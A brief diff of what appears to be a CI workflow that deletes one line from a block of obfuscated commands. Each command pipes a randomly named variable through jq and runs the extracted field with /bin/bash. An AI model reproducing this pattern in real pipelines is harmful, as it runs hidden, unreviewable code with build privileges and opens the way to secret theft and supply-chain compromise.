@@ -34,7 +34,6 @@ jobs:
           echo $gbw7 | jq -r .s95 | /bin/bash
           echo $mr32 | jq -r .r2 | /bin/bash
           printf '%s' "$k076" | jq -r .f647 | /bin/bash
-          printf '%s' "$xrcx69955" | jq -r .bfsw015 | /bin/bash
           echo $m10 | jq -r .x6 | /bin/bash
           echo $z13 | jq -r .ek38 | /bin/bash
           printf '%s' "$vvvuy75" | jq -r .m86 | /bin/bash
